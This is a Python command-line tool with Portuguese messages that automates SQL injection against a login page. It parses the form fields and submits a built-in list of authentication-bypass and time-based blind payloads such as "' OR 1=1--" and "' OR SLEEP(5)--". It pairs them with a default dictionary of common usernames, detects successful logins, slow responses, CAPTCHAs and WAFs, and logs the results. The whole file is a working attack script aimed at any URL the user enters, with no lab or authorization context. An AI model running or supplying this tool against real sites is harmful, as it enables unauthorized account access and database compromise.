import requests
import time
from datetime import datetime
from bs4 import BeautifulSoup

# Payloads padrão e "blind"
payloads = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR '1'='1' --",
    "' OR 1=1#",
    "' OR 1=1/*",
    "admin' --",
    "' OR '1'='1' /*",
    "' OR sleep(5)--",
    "' OR SLEEP(5)#",
    "' OR 1=1 AND SLEEP(5)--",
    "' OR IF(1=1,SLEEP(5),0)--",
    "' OR IF(1=1,SLEEP(5),0)#",
    "admin' AND SLEEP(5)--",
    "\" OR SLEEP(5)#",
    "' OR ''='",
]

def blue_text(text):
    return f"\033[34m{text}\033[0m"

def extract_form_fields(html):
    soup = BeautifulSoup(html, 'html.parser')
    form = soup.find('form')
    if not form:
        print(blue_text("[!] Nenhum formulário encontrado."))
        return None, None, None, None, None

    action = form.get('action')
    method = form.get('method', 'post').lower()
    inputs = form.find_all('input')
    fields = {}
    user_field = None
    pass_field = None

    for input_tag in inputs:
        name = input_tag.get('name')
        input_type = input_tag.get('type', 'text')

        if not name:
            continue

        if input_type in ['text', 'email'] and not user_field:
            user_field = name
        elif input_type == 'password' and not pass_field:
            pass_field = name
        fields[name] = ''

    return action, method, fields, user_field, pass_field

def confirm_successful_login(response, login_url):
    soup = BeautifulSoup(response.text, 'html.parser')
    title = soup.title.string.strip() if soup.title else ""
    keywords = ['logout', 'painel', 'admin', 'dashboard', 'sair']
    if response.url != login_url or any(k in response.text.lower() for k in keywords):
        return True, title
    return False, title

def test_sql_injection(url, usernames):
    session = requests.Session()
    print(blue_text("[-] Acessando página de login..."))
    resp = session.get(url)
    action, method, fields, user_field, pass_field = extract_form_fields(resp.text)

    if not all([action, user_field, pass_field]):
        print(blue_text("[!] Não foi possível identificar os campos do formulário."))
        return

    login_url = action if action.startswith("http") else requests.compat.urljoin(url, action)
    working_payloads = []

    # Criação do arquivo de relatório
    report_filename = f"relatorio_sqlinj_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(report_filename, 'w', encoding='utf-8') as report:
        report.write(f"Relatório de Teste - {datetime.now()}\n")
        report.write(f"URL de login: {url}\n\n")

    print(f"\n{blue_text('[*] Testando payloads...')}")

    for username in usernames:
        for payload in payloads:
            data = fields.copy()
            data[user_field] = username
            data[pass_field] = payload

            try:
                start_time = time.time()

                if method == 'post':
                    response = session.post(login_url, data=data)
                else:
                    response = session.get(login_url, params=data)

                elapsed = time.time() - start_time

                with open(report_filename, 'a', encoding='utf-8') as report:
                    report.write(f"Usuário: {username} | Payload: {payload} | Tempo: {elapsed:.2f}s\n")

                    # Detecção de CAPTCHA ou WAF
                    if 'captcha' in response.text.lower() or 'verifique' in response.text.lower():
                        report.write("→ ⚠️ CAPTCHA detectado na resposta!\n")

                    if response.status_code == 403:
                        report.write("→ ❌ Acesso negado (403) - possível WAF\n")

                    if 'waf' in response.text.lower() or 'access denied' in response.text.lower():
                        report.write("→ 🚨 WAF suspeito detectado!\n")

                    if logged_in := confirm_successful_login(response, login_url)[0]:
                        report.write("→ ✅ Login bem-sucedido!\n\n")
                    elif elapsed > 4:
                        report.write("→ ⚠️ Resposta lenta - possível SQLi blind\n\n")
                    else:
                        report.write("→ - Sem resposta suspeita\n\n")

            except Exception as e:
                print(blue_text(f"[!] Erro com payload {payload} para o usuário {username}: {e}"))

    print(blue_text("\n[✓] Testes finalizados."))
    print(blue_text(f"[+] Relatório salvo em: {report_filename}"))

def menu():
    print(blue_text("""
  /$$$$$$            /$$
 /$$__  $$          | $$
| $$  \__/  /$$$$$$ | $$
|  $$$$$$  /$$__  $$| $$
 \____  $$| $$  \ $$| $$
 /$$  \ $$| $$  | $$| $$
|  $$$$$$/|  $$$$$$$| $$
 \______/  \____  $$|__/
               | $$    
               | $$    
               |__/    
    """))

    print(blue_text("1. Testar SQL Injection em login"))
    print(blue_text("2. Sair"))

def main():
    while True:
        menu()
        choice = input(blue_text("Escolha uma opção: ")).strip()

        if choice == "1":
            url = input(blue_text("Insira a URL da página de login: ")).strip()
            usernames_input = input(blue_text("Insira os nomes de usuário separados por vírgula (ou pressione Enter para usar dicionário): ")).strip()

            if not usernames_input.strip():
                print(blue_text("[*] Nenhum usuário informado, usando dicionário padrão..."))
                usernames = [
                    "admin", "administrator", "root", "user", "guest", "test",
                    "admin123", "user1", "demo", "login", "john", "maria", "admin1"
                ]
            else:
                usernames = [u.strip() for u in usernames_input.split(",")]

            test_sql_injection(url, usernames)

        elif choice == "2":
            print(blue_text("Saindo..."))
            break
        else:
            print(blue_text("[!] Opção inválida. Tente novamente."))

if __name__ == '__main__':
    main()
